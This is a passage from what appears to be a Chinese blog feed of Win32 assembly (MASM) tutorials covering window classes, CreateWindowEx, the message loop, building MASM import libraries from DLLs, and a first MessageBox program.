<p>WNDCLASSEX 中最重要的成员莫过于lpfnWndProc了。前缀 lpfn 表示该成员是一个指向函数的长指针。在 Win32中由于内存模式是 FLAT 型，所以没有 near 或 far 的区别。每一个窗口类必须有一个窗口过程，当 Windows 把属于特定窗口的消息发送给该窗口时，该窗口的窗口类负责处理所有的消息，如键盘消息或鼠标消息。由于窗口过程差不多智能地处理了所有的窗口消息循环，所以您只要在其中加入消息处理过程即可。下面我将要讲解 WNDCLASSEX 的每一个成员</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WNDCLASSEX STRUCT DWORD </span><br><span class="line">  cbSize            DWORD      ? </span><br><span class="line">  style             DWORD      ? </span><br><span class="line">  lpfnWndProc       DWORD      ? </span><br><span class="line">  cbClsExtra        DWORD      ? </span><br><span class="line">  cbWndExtra        DWORD      ? </span><br><span class="line">  hInstance         DWORD      ? </span><br><span class="line">  hIcon             DWORD      ? </span><br><span class="line">  hCursor           DWORD      ? </span><br><span class="line">  hbrBackground     DWORD      ? </span><br><span class="line">  lpszMenuName      DWORD      ? </span><br><span class="line">  lpszClassName     DWORD      ? </span><br><span class="line">  hIconSm           DWORD      ? </span><br><span class="line">WNDCLASSEX ENDS</span><br></pre></td></tr></table></figure>
<ul>
<li><code>cbSize</code>：WNDCLASSEX 的大小。我们可以用sizeof（WNDCLASSEX）来获得准确的值。 </li>
<li><code>style</code>：从这个窗口类派生的窗口具有的风格。您可以用“or”操作符来把几个风格或到一起。 </li>
<li><code>lpfnWndProc</code>：窗口处理函数的指针。 </li>
<li><code>cbClsExtra</code>：指定紧跟在窗口类结构后的附加字节数。 </li>
<li><code>cbWndExtra</code>：指定紧跟在窗口事例后的附加字节数。如果一个应用程序在资源中用CLASS伪指令注册一个对话框类时，则必须把这个成员设成DLGWINDOWEXTRA。 </li>
<li><code>hInstance</code>：本模块的事例句柄。 </li>
<li><code>hIcon</code>：图标的句柄。 </li>
<li><code>hCursor</code>：光标的句柄。 </li>
<li><code>hbrBackground</code>：背景画刷的句柄。 </li>
<li><code>lpszMenuName</code>：指向菜单的指针。 </li>
<li><code>lpszClassName</code>：指向类名称的指针。 </li>
<li><code>hIconSm</code>：和窗口类关联的小图标。如果该值为NULL。则把hCursor中的图标转换成大小合适的小图标。 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">invoke CreateWindowEx， NULL，\</span><br><span class="line">ADDR ClassName，\</span><br><span class="line">ADDR AppName，\</span><br><span class="line">WS_OVERLAPPEDWINDOW，\</span><br><span class="line">CW_USEDEFAULT，\</span><br><span class="line">CW_USEDEFAULT，\</span><br><span class="line">CW_USEDEFAULT，\</span><br><span class="line">CW_USEDEFAULT，\ </span><br><span class="line">NULL，\ </span><br><span class="line">NULL，\</span><br><span class="line">hInst，\</span><br><span class="line">NULL</span><br></pre></td></tr></table></figure>
<p>注册窗口类后，我们将调用<code>CreateWindowEx</code>来产生实际的窗口。请注意该函数有12个参数。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CreateWindowExA proto dwExStyle：DWORD，\</span><br><span class="line">lpClassName：DWORD，\</span><br><span class="line">lpWindowName：DWORD，\ </span><br><span class="line">dwStyle：DWORD，\</span><br><span class="line">X：DWORD，\</span><br><span class="line">Y：DWORD，\</span><br><span class="line">nWidth：DWORD，\</span><br><span class="line">nHeight：DWORD，\</span><br><span class="line">hWndParent：DWORD ，\</span><br><span class="line">hMenu：DWORD，\ </span><br><span class="line">hInstance：DWORD，\</span><br><span class="line">lpParam：DWORD</span><br></pre></td></tr></table></figure>
<p>我们来仔细看一看这些的参数：</p>
<ul>
<li><code>dwExStyle</code>：附加的窗口风格。相对于旧的CreateWindow这是一个新的参数。在9X/NT中您可以使用新的窗口风格。您可以在Style中指定一般的窗口风格，但是一些特殊的窗口风格，如顶层窗口则必须在此参数中指定。如果您不想指定任何特别的风格，则把此参数设为NULL。 </li>
<li><code>lpClassName</code>：（必须）。ASCIIZ形式的窗口类名称的地址。可以是您自定义的类，也可以是预定义的类名。像上面所说，每一个应用程序必须有一个窗口类。 </li>
<li><code>lpWindowName</code>：ASCIIZ形式的窗口名称的地址。该名称会显示在标题条上。如果该参数空白，则标题条上什么都没有。 </li>
<li><code>dwStyle</code>：窗口的风格。在此您可以指定窗口的外观。可以指定该参数为零，但那样该窗口就没有系统菜单，也没有最大化和最小化按钮，也没有关闭按钮，那样您不得不按Alt+F4 来关闭它。最为普遍的窗口类风格是 <code>WS_OVERLAPPEDWINDOW</code>。 一种窗口风格是一种按位的掩码，这样您可以用<code>or</code>把您希望的窗口风格或起来。像 <code>WS_OVERLAPPEDWINDOW</code> 就是由几种最为普遍的风格<code>or</code>起来的。 </li>
<li><code>X</code>，<code>Y</code>： 指定窗口左上角的以像素为单位的屏幕坐标位置。缺省地可指定为 <code>CW_USEDEFAULT</code>，这样 Windows 会自动为窗口指定最合适的位置。 </li>
<li><code>nWidth</code>，<code>nHeight</code>： 以像素为单位的窗口大小。缺省地可指定为 <code>CW_USEDEFAULT</code>，这样 Windows 会自动为窗口指定最合适的大小。 </li>
<li><code>hWndParent</code>： 父窗口的句柄（如果有的话）。这个参数告诉 Windows 这是一个子窗口和他的父窗口是谁。这和 MDI（多文档结构）不同，此处的子窗口并不会局限在父窗口的客户区内。他只是用来告诉 Windows 各个窗口之间的父子关系，以便在父窗口销毁是一同把其子窗口销毁。在我们的例子程序中因为只有一个窗口，故把该参数设为 NULL。 </li>
<li><code>hMenu</code>： WINDOWS菜单的句柄。如果只用系统菜单则指定该参数为NULL。回头看一看<code>WNDCLASSEX</code> 结构中的 <code>lpszMenuName</code> 参数，它也指定一个菜单，这是一个缺省菜单，任何从该窗口类派生的窗口若想用其他的菜单需在该参数中重新指定。其实该参数有双重意义：一方面若这是一个自定义窗口时该参数代表菜单句柄，另一方面，若这是一个预定义窗口时，该参数代表是该窗口的 ID 号。Windows 是根据<code>lpClassName</code> 参数来区分是自定义窗口还是预定义窗口的。 </li>
<li><code>hInstance</code>： 产生该窗口的应用程序的实例句柄。 </li>
<li><code>lpParam</code>： （可选）指向欲传给窗口的结构体数据类型参数的指针。如在MDI中在产生窗口时传递 CLIENTCREATESTRUCT 结构的参数。一般情况下，该值总为零，这表示没有参数传递给窗口。可以通过GetWindowLong 函数检索该值。 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov hwnd，eax</span><br><span class="line">invoke ShowWindow， hwnd，CmdShow</span><br><span class="line">invoke UpdateWindow， hwnd</span><br></pre></td></tr></table></figure>
<p>调用<code>CreateWindowEx</code>成功后，窗口句柄在eax中。我们必须保存该值以备后用。我们刚刚产生的窗口不会自动显示，所以必须调用 <code>ShowWindow</code> 来按照我们希望的方式来显示该窗口。接下来调用 <code>UpdateWindow</code> 来更新客户区。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.WHILE TRUE</span><br><span class="line">invoke GetMessage， ADDR msg，NULL，0，0</span><br><span class="line">.BREAK .IF (!eax)</span><br><span class="line">invoke TranslateMessage， ADDR msg </span><br><span class="line">invoke DispatchMessage， ADDR msg</span><br><span class="line">.ENDW</span><br></pre></td></tr></table></figure>
<p>这时候我们的窗口已显示在屏幕上了。但是它还不能从外界接收消息。所以我们必须给它提供相关的消息。我们是通过一个<strong>消息循环</strong>来完成该项工作的。每一个模块仅有一个消息循环，我们不断地调用 <code>GetMessage</code> 从 Windows 中获得消息。<code>GetMessage</code> 传递一个 MSG 结构体给 Windows ，然后 Windows 在该函数中填充有关的消息，一直到 Windows 找到并填充好消息后 <code>GetMessage</code> 才会返回。在这段时间内系统控制权可能会转移给其他的应用程序。这样就构成了Windows 下的多任务结构。如果 <code>GetMessage</code> 接收到 <code>WM_QUIT</code> 消息后就会返回 <code>FALSE</code>，使循环结束并退出应用程序。<code>TranslateMessage</code> 函数是一个是实用函数，它从键盘接受原始按键消息，然后解释成 <code>WM_CHAR</code>，再把 <code>WM_CHAR</code> 放入消息队列，由于经过解释后的消息中含有按键的 ASCII 码，这比原始的扫描码好理解得多。<strong>如果您的应用程序不处理按键消息的话，可以不调用该函数。</strong><code>DispatchMessage</code> 会把消息发送给负责该窗口过程的函数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov eax，msg.wParam</span><br><span class="line">ret</span><br><span class="line">WinMain endp</span><br></pre></td></tr></table></figure>
<p>如果消息循环结束了，退出码存放在 MSG 中的 wParam中，您可以通过把它放到 eax 寄存器中传给 Windows，目前 Windows 没有利用到这个结束码，但我们最好还是遵从 Windows 规范已防意外。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WndProc proc hWnd：HWND， uMsg：UINT， wParam：WPARAM， lParam：LPARAM</span><br></pre></td></tr></table></figure>
<p>是我们的窗口处理函数。您可以随便给该函数命名。其中第一个参数 hWnd 是接收消息的窗口的句柄。uMsg 是接收的消息。注意 uMsg 不是一个 MSG 结构，其实上只是一个 DWORD 类型数。Windows 定义了成百上千个消息，大多数您的应用程序不会处理到。当有该窗口的消息发生时，Windows 会发送一个相关消息给该窗口。其窗口过程处理函数会智能的处理这些消息。wParam 和 lParam 只是附加参数，以方便传递更多的和该消息有关的数据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.IF uMsg==WM_DESTROY</span><br><span class="line">invoke PostQuitMessage，NULL</span><br><span class="line">.ELSE </span><br><span class="line">invoke DefWindowProc，hWnd，uMsg，wParam，lParam</span><br><span class="line">ret</span><br><span class="line">.ENDIF</span><br><span class="line">xor eax，eax </span><br><span class="line">ret</span><br><span class="line">WndProc endp</span><br></pre></td></tr></table></figure>
<p><strong>上面可以说是关键部分。这也是我们写 Windows 程序时需要改写的主要部分。</strong>此处您的程序检查 Windows 传递过来的消息，如果是我们感兴趣的消息则加以处理，处理完后，在 eax 寄存器中传递 0，否则必须调用 <code>DefWindowProc</code>，把该窗口过程接收到的参数传递给缺省的窗口处理函数。所有消息中您<strong>必须处理的是 <code>WM_DESTROY</code></strong>，当您的应用程序结束时 Windows 把这个消息传递进来，当您的应用程序接收到该消息时它已经在屏幕上消失了，这仅是通知您的应用程序窗口已销毁，您必须自己准备返回 Windows 。在此消息中您可以做一些清理工作，但无法阻止退出应用程序。如果您要在窗口销毁前做一些额外工作，可以处理 <code>WM_CLOSE</code> 消息。在处理完清理工作后，您必须调用 <code>PostQuitMessage</code>，该函数会把 <code>WM_QUIT</code> 消息传回您的应用程序，而该消息会使得 GetMessage 返回，并在 eax 寄存器中放入 0，然后会结束消息循环并退回 WINDOWS。您可以在您的程序中调用 <code>DestroyWindow</code> 函数，它会发送一个 WM_DESTROY 消息给您自己的应用程序，从而迫使它退出。</p>
]]></content>
      <categories>
        <category>汇编(ASM)</category>
      </categories>
      <tags>
        <tag>ASM</tag>
        <tag>读书笔记</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>怎样建立你自己的MASM导入库</title>
    <url>/2018/02/06/%E6%80%8E%E6%A0%B7%E5%BB%BA%E7%AB%8B%E4%BD%A0%E8%87%AA%E5%B7%B1%E7%9A%84MASM%E5%AF%BC%E5%85%A5%E5%BA%93.html</url>
    <content><![CDATA[<p>by Iczelion （翻译：花心萝卜<a href="mailto:yqzq@163.net" target="_blank" rel="noopener">yqzq@163.net</a>) 9.5.2000</p>
<p>这篇短文是讲述关于建立MASM导入库（import libraries）技巧，我假设你已经知道什么是导入库。在下面，我将集中讲述建立MASM导入库的方法。</p>
<a id="more"></a>
<hr>
<h2 id="MASM导入库的格式："><a href="#MASM导入库的格式：" class="headerlink" title="MASM导入库的格式："></a>MASM导入库的格式：</h2><hr>
<p>MASM和VC++可以使用相同的导入库，MS导入库使用不同于TASM的OMF格式的变更的COFF文件格式，这就是为什么TASM和MASM的导入库不能互用的原因，我将不详细介绍有关MS导入库的格式。可以这样说，每一个MS导入库都包含某个DLL中函数的信息（你将要用这些信息来调用DLL中的函数），这些信息包括函数名和它所有参数的尺寸。如果你用一个文本编辑器打开kernel32.lib，你回发现一些如下格式的信息：  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_ExitProcess@4 </span><br><span class="line">_CreateProcessA@40</span><br></pre></td></tr></table></figure>
<p>函数名被装饰上了一个“_”，在“@”之后的数字表示了该函数所有参数的尺寸（字节为单位），ExitProcess 函数只有一个DWORD的参数，所以后面的数字是4。 LIB中为什么要包含这些参数尺寸的信息呢？当你用INVOKE调用函数时，这些信息被用来检测传递给函数的参数是否正确。如果你使用“手工”将参数压入堆栈，并通过“CALL”来调用函数的话，MASM将无法检测参数是否正确。这将导致我们几乎没有办法建立一个DLL的导入库，因为DLL并不包含清楚的关于参数尺寸的信息。</p>
<hr>
<h2 id="从DLL建立MASM导入库"><a href="#从DLL建立MASM导入库" class="headerlink" title="从DLL建立MASM导入库"></a>从DLL建立MASM导入库</h2><hr>
<p>如果你很乐意用“手动”（CALL）的方法去调用函数的话，你可以象下面这样为任何一个DLL建立MASM的导入库：<br>使用dumpbin.exe,它可以导出DLL 输出（EXPORT）函数的名字。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Dumpbin /EXPORTS  blah.dll  &gt;  output.txt</span><br></pre></td></tr></table></figure></p>
<p>在你获得了函数名列表之后，通过他们建立一个模块定义文件（.DEF）。 举个例子：如果DLL只包含一个函数：GetSomeLine 在一个文本文件中输入如下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LIBRARY blah </span><br><span class="line">EXPORTS </span><br><span class="line">GetSomeLine</span><br></pre></td></tr></table></figure>
<p>并将其保存为“blah.def<br>象这样，运行lib.exe，通过模块定义文件建立一个导入库：  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lib /DEF:blah.def</span><br></pre></td></tr></table></figure>
<p>就是它了！你将获得blah.lib,只要你不使用INVOKE调用函数的话，你就可以在MASM中使用它。</p>
<hr>
<h2 id="建立通过INVOKE调用函数的MASM导入库"><a href="#建立通过INVOKE调用函数的MASM导入库" class="headerlink" title="建立通过INVOKE调用函数的MASM导入库:"></a>建立通过INVOKE调用函数的MASM导入库:</h2><hr>
<p>我并不反对你使用上面的方法，但INVOKE确实是一个调用函数的好途径。这也是我较TASM更喜欢MASM的原因之一。但就象我早先强调的，我们几乎不可能从一个DLL建立一个能100%工作的MASM导入库。如果你使用INVOKE，你将不能用上面的方法建立一个MASM导入库。举个例子，你可以想象如果你在.DEF文件中修改了函数的“@XX”部分，导入库将仍然正常建立，但请相信我，他不会工作的。 建立一个可以使用INVOKE的导入库的一个简单的方法是使用MASM。如果你写过DLL的代码，你会发现你不仅的到了一个DLL，而且还得到了一个导入库，没错，它就是我们要得！ 我们的策略是： </p>
<ol>
<li>获得函数名和所有参数的尺寸</li>
<li>建立一个包含正确个数和尺寸的DLL源代码 </li>
<li>建立一个描述ASM源代码中相应函数的模块定义文件（.DEF） </li>
<li>将源代码按DLL汇编 </li>
</ol>
<p>你将获得一个功能完全的MASM导入库，上面的步骤应做更多的说明 </p>
<hr>
<h2 id="获得函数名和所有参数尺寸"><a href="#获得函数名和所有参数尺寸" class="headerlink" title="获得函数名和所有参数尺寸"></a>获得函数名和所有参数尺寸</h2><hr>
<p>这是我们处理过程中最困难的部分了。如果你仅仅只有DLL，你将经历无意义的冒险。下面是我所能想出的方法，不过没有一个能100%工作。  </p>
<p>使用交互式反编译工具（Interactive Disassembler (IDA)）反编译DLL，通过这个奇妙的工具，你可以获得函数参数的大概尺寸，但这些信息是不完全的，IDA是一个功能强大的工具，不过有时必须靠我们自己判断什么是什么。你将不得不仔细分析反编译后的结果。  </p>
<p>观察堆栈指针在调用函数之前和之后的值。方法如下：  </p>
<ol>
<li>通过GetProcAddress获得函数的地址。</li>
<li>调用想要测试的每一个函数，但请注意，调用这些函数时，不要给他们传递任何的参数。调用前请注意ESP的值。</li>
<li>当函数返回后，比较调用函数前、后ESP的值。基本原理是：stdcall参数调用协定规定，函数自己负责恢复堆栈，现在知道为什么我们要不传递任何参数了吧，我们没传递参数，而函数却自作聪明“恢复”了ESP指针，所以ESP的变化值就是我们要得参数尺寸了。</li>
</ol>
<p>不过，上面的方法并不是万无一失的，下面的这些情况将会导致失败：</p>
<ul>
<li>如果DLL中的函数使用了不同于stdcall的别的参数传递协定。</li>
<li>如果函数在恢复堆栈时失败，我们将无法得到ESP的正确值。</li>
<li>如果这个函数的作用是去做一些危险的事情，比如硬盘格式化，那我们即使得到了ESP，恐怕代价大了点</li>
</ul>
<p>研究现有的使用DLL的程序，你可以通过调试/反编译这些程序去获得函数参数的个数和尺寸。不论如何，只要有函数在DLL中，而又没有任何程序调用过它，你可以用上面的两个方法。 </p>
<hr>
<h2 id="建立我们自己的DLL"><a href="#建立我们自己的DLL" class="headerlink" title="建立我们自己的DLL"></a>建立我们自己的DLL</h2><hr>
<p>在你获得了函数的名字和参数尺寸后，你可以建立一个DLL框架并在框架中添加和其他DLL、文件中的相同名称的函数。举个例子，如果DLL只含有一个函数：GetSomeLine.它有16BYTES的参数。在ASM文件中，你可以这样写： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.386 </span><br><span class="line">.model flat,stdcall </span><br><span class="line">.code </span><br><span class="line">GetSomeLine proc param1:DWORD, param2:DWORD, param3:DWORD, param4:DWORD </span><br><span class="line">GetSomeline endp </span><br><span class="line">end</span><br></pre></td></tr></table></figure>
<p>你可能要问，“这是什么？”。一个没有处理部分的程序？请记住：一个导入库并没有记录一个函数是如何实现的，它只是记录函数名和参数尺寸而已，它的任务就是提供函数的名称和尺寸。所以我们不需要添加函数的处理部分。当我们建立DLL时，MASM会帮我们完成它的导入库的建立。 MASM在建立导入库时并不关心每个具体参数的尺寸，它总是象下面这样：<br>　<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.386 </span><br><span class="line">.model flat,stdcall </span><br><span class="line">.code </span><br><span class="line">GetSomeLine proc param1:BYTE, param2:BYTE, param3:BYTE, param4:BYTE </span><br><span class="line">GetSomeline endp </span><br><span class="line">end</span><br></pre></td></tr></table></figure></p>
<p>然后MASM将在导入库中建立_GetSomeLine@16(它会把每一个参数看作DWORD)，而并不管它的参数是4个BYTE还是DWORD或是其他什么</p>
<hr>
<h2 id="建立匹配的模块定义文件（-DEF）"><a href="#建立匹配的模块定义文件（-DEF）" class="headerlink" title="建立匹配的模块定义文件（.DEF）"></a>建立匹配的模块定义文件（.DEF）</h2><hr>
<p>这是一个简单的工作，你需要这个文件来指导MASM去建立正确的DLL和与之匹配的导入库。一个模块定义文件模板如下： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LIBRARY  &lt;The name of the DLL&gt; </span><br><span class="line">EXPORTS </span><br><span class="line">&lt;The names of the functions&gt;</span><br></pre></td></tr></table></figure>
<p>你仅仅需要填入DLL的名字，然后在EXPORTS下添入函数的名字。每个函数名一行。保存文件，你将获得一个模块定义文件。 </p>
<hr>
<h2 id="汇编DLL源代码"><a href="#汇编DLL源代码" class="headerlink" title="汇编DLL源代码"></a>汇编DLL源代码</h2><hr>
<p>最后一步也是最简单的一步，仅仅需要ML.EXE和LINK.EXE<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ml /c /coff /Cp blah.asm </span><br><span class="line">link /DLL /NOENTRY /def:blah.def /subsystem:windows blah.obj</span><br></pre></td></tr></table></figure></p>
<p>好了，查看一下你的项目目录，你会发现你想要的导入库和DLL。</p>
<p><strong>转自<a href="http://blog.csdn.net/taowen2002/article/details/15837" target="_blank" rel="noopener">http://blog.csdn.net/taowen2002/article/details/15837</a></strong></p>
]]></content>
      <categories>
        <category>汇编(ASM)</category>
      </categories>
      <tags>
        <tag>ASM</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>win32 汇编学习(2)：消息框</title>
    <url>/2018/02/05/win32-%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-2-%EF%BC%9A%E6%B6%88%E6%81%AF%E6%A1%86.html</url>
    <content><![CDATA[<p>这一次，我们将用汇编语言写一个 Windows 程序，程序运行时将弹出一个消息框并显示”你好，我的第一个Win32汇编程序”。</p>
<a id="more"></a>
<h2 id="理论知识"><a href="#理论知识" class="headerlink" title="理论知识"></a>理论知识</h2><p>Windows 为编写应用程序提供了大量的资源。其中最重要的是Windows API (Application Programming Interface)。 Windows API是一大组功能强大的函数，它们本身驻扎在 Windows 中供人们随时调用。这些函数的大部分被包含在几个动态链接库(DLL)中，譬如：kernel32.dll、 user32.dll 和 gdi32.dll。 Kernel32.dll中的函数主要处理内存管理和进程调度；user32.dll中的函数主要控制用户界面；gdi32.dll中的函数则负责图形方面的操作。除了上面主要的三个动态链接库，您还可以调用包含在其他动态链接库中的函数，当然您必须要有关于这些函数的足够的资料。  </p>
<p>动态链接库，顾名思义，这些 API 的代码本身并不包含在 Windows 可执行文件中，而是当要使用时才被加载。为了让应用程序在运行时能找到这些函数，就必须事先把有关的重定位信息嵌入到应用程序的可执行文件中。这些信息存在于引入库中，由链接器把相关信息从引入库中找出插入到可执行文件中。您必须指定正确的引入库，因为只有正确的引入库才会有正确的重定位信息。  </p>
<p>当应用程序被加载时 Windows 会检查这些信息，这些信息包括动态链接库的名字和其中被调用的函数的名字。若检查到这样的信息，Windows 就会加载相应的动态链接库，并且重定位调用的函数语句的入口地址，以便在调用函数时控制权能转移到函数内部。  </p>
<p>如果从和字符集的相关性来分，API 共有两类：一类是处理 ANSI 字符集的，另一类是处理 UNICODE 字符集的。前一类函数名字的尾部带一个”A”字符，处理UNICODE的则带一个”W”字符(宽字符)。我们比较熟悉的ANSI字符串是以 0 (NULL) 结尾的一串字符数组，每一个ANSI字符是一个 BYTE 宽。对于欧洲语言体系，ANSI 字符集已足够了，但对于有成千上万个唯一字符的几种象形语言体系来说就只有用 UNICODE 字符集了。每一个 UNICODE 字符占有两个 BYTE 宽，这样一来就可以在一个字符串中使用 65336 个不同字符了。  </p>
<p>这也是为什么引进 UNICODE 的原因。在大多数情况下我们都可以包含一个头文件，在其中定义一个宏，然后在实际调用函数时，函数名后不需要加后缀”A”或”W”。<br>如在头文件中定义函数<code>foo()</code>；</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICODE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> foo() fooW()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> foo() fooA()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>我先把程序框架放在下面，然后我们再向里面加东西。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.386</span><br><span class="line">.model flat， stdcall</span><br><span class="line">.data</span><br><span class="line">.code</span><br><span class="line">start：</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<p>应用程序的执行是从 END 定义的标识符后的第一条语句开始的。在上面的框架程序中就是从 START 开始。程序逐条语句执行一直到遇到 JMP，JNE，JE，RET 等跳转指令。这些跳转指令将把执行权转移到其他语句上，若程序要退出 Windows，则必须调用函数 ExitProcess。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ExitProcess proto uExitCode：DWORD</span><br></pre></td></tr></table></figure>
<p>上面一行是函数原型。函数原型会告诉编译器和链接器该函数的属性，这样在编译和链接时，编译器和链接器就会作相关的类型检查。 函数的原型定义如下： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">FunctionName PROTO [ParameterName]：DataType，[ParameterName]：DataType，...</span><br></pre></td></tr></table></figure>
<p>简言之，就是在函数名后加伪指令PROTO，再跟一串由逗号相隔的数据类型链表。在前面的 ExitProcess 定义中，该函数有一个 DWORD 类型的参数。当您使用高层调用语句 INVOKE 时，使用函数原型定义特别有用，您可以简单地认为 <strong>INVOKE 是一个有参数类型检查的调用语句</strong>。譬如，假设您这样写：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">call ExitProcess</span><br></pre></td></tr></table></figure>
<p>若您事先没把一个DWORD类型参数压入堆栈，编译器和链接器都不会报错，但毫无疑问，在您的程序运行时将引起崩溃。但是，当您这样写：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">invoke ExitProcess</span><br></pre></td></tr></table></figure>
<p>连接器将报错提醒您忘记压入一个 DWORD 类型参数。所以我<strong>建议您用 INVOKE 指令而不是CALL去调用一个函数</strong>。INVOKE 的语法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INVOKE expression [，arguments]</span><br></pre></td></tr></table></figure>
<p>expression <strong>既可以是一个函数名也可以是一个函数指针</strong>。参数由逗号隔开。大多数API函数的原型放在头文件中。 如果您用的是 MASM32，这些头文件在文件夹MASM32/include 下， 这些头文件的扩展名为 INC，函数名和 DLL 中的函数名相同，譬如：KERNEL32.LIB 引出的函数 ExitProcess 的函数原形声明于kernel.inc中。您也可以自己声明函数原型。 </p>
<p>好，我们现在回到ExitProcess 函数，参数uExitCode 是您希望当您的应用程序结束时传递 Windows 的。 您可以这样写： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">invoke ExitProcess，0</span><br></pre></td></tr></table></figure>
<p>把这一行放到<code>start</code>标识符下，这个应用程序就会立即退出 Windows，当然毫无疑问个应用程序本身是一个完整的 Windows 程序。</p>
<p><strong>IDE为Visual MASM，masm32安装在c:\masm32</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">386</span><br><span class="line">.model flat， stdcall</span><br><span class="line">option casemap：none</span><br><span class="line"></span><br><span class="line">include c:\masm32\include\windows.inc</span><br><span class="line">include c:\masm32\include\kernel32.inc</span><br><span class="line">includelib c:\masm32\lib\kernel32.lib</span><br><span class="line"></span><br><span class="line">.data</span><br><span class="line">.code</span><br><span class="line">start:</span><br><span class="line">invoke ExitProcess，0</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<p><code>option casemap：none</code> 一句的意思是告诉 MASM 要区分标号的大小写，譬如：start 和 START 是不同的。请注意新的伪指令 include，跟在其后的文件名所指定的文件在编译时将“插”在该处。在我们上面的程序段中，当MASM处理到语句 <code>include c:\masm\include\windows.inc</code> 时，它就会打开文件夹c:\masm32\include 中的文件windows.inc，这和您把整个文件都粘贴到您的源程序中的效果是一样的。 windows.inc 包含了 WIN32 编程所需要的常量和结构体的定义。 但是它不包含函数原型的定义。  </p>
<p>您的应用程序除了从 windows.inc 中得到相关变量结构体的定义外，还需要从其他的头文件中得到函数原型的声明，这些头文件都放在 c:\masm32\include 文件夹中。 在我们上面的例子中调用了 kernel.dll 中的函数，所以需要包含有这个函数原型声明的头文件 kernel.inc。如果用文本编辑器打开该文件您会发现里面全是从 kernel.dll中引出的函数的声明。如果您不包含kernel.inc，您仍然可以调用（call）ExitProcess，但不能够调用（invoke）ExitProcess（这会无法通过编译器和连接器的参数合法性检查）。所以若用 invoke 去调用一个函数，您就必须事先声明包含头文件，您完全可以在调用该函数前在源代码的适当位置进行声名。包含头文件主要是为了节省时间（当然还有正确性）  </p>
<p>接下来我们来看看 <code>includelib</code> 伪指令，和 <code>include</code> 不同，它仅仅是告诉编译器您的程序引用了哪个库。当编译器处理到该指令时会在生成的目标文件中插入链接命令告诉链接器链入什么库。当然您还可以通过在链接器的命令行指定引入库名称的方法来达到和用includelib指令相同的目的，但考虑到命令行仅能够传递128个字符而且要不厌其烦地在命令行敲字符，所以这种方法是非常不可取的。</p>
<h3 id="命令行编译"><a href="#命令行编译" class="headerlink" title="命令行编译"></a>命令行编译</h3><p>好了，现在保存例子，取名为msgbox.asm。把 ml.exe（C:\masm32\bin） 的路径放到 PATH 环境变量中，键入下面一行 进行编译：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ml /c /coff /Cp msgbox.asm</span><br></pre></td></tr></table></figure>
<ul>
<li><code>/c</code> 是告诉MASM只编译不链接。这主要是考虑到在链接前您可能还有其他工作要做。 </li>
<li><code>/coff</code> 告诉MASM产生的目标文件用 coff 格式。MASM 的 coff 格式是COFF（Common Object File Format：通用目标文件格式） 格式的一种变体。在 UNIX 下的 COFF 格式又有不同。 </li>
<li><code>/Cp</code> 告诉 MASM 不要更改用户定义的标识符的大小写。在.model 指令下加入 “option casemap：none” 语句，可达到同样的效果。<br>当您成功的编译了 msgbox.asm 后，编译器会产生 msgbox.obj 目标文件，目标文件和可执行文件只一步之遥，目标文件中包含了以二进制形式存在的指令和数据，比可执行文件相差的只是链接器加入的重定位信息。 </li>
</ul>
<p>好，我们来链接目标文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">link /SUBSYSTEM：WINDOWS /LIBPATH：c：\masm32\lib msgbox.obj</span><br></pre></td></tr></table></figure>
<ul>
<li><code>/SUBSYSTEM：WINDOWS</code> 告诉链接器可执行文件的运行平台 </li>
<li><code>/LIBPATH：〈path to import library〉</code> 告诉链接器引入库的路径。<br>链接器做的工作就是根据引入库往目标文件中加入重定位信息，最后产生可执行文件。 既然得到了可执行文件，我们来运行一下。好，一、二、三，GO！屏幕上什么都没有。哦，对了，我们除了调用了 ExitProcess 函数外，什么都还没做呢！但是别一点成就感都没有哦，因为我们用汇编所写的是一个真正 Windows 程序，不信的话，看看您磁盘上的 msgbox.exe文件。</li>
</ul>
<p>下面我们来做一点可以看的见摸的着的，我们在程序中加入一个对话框。该函数的原型如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MessageBox PROTO hwnd：DWORD， lpText：DWORD， lpCaption：DWORD， uType：DWORD</span><br></pre></td></tr></table></figure>
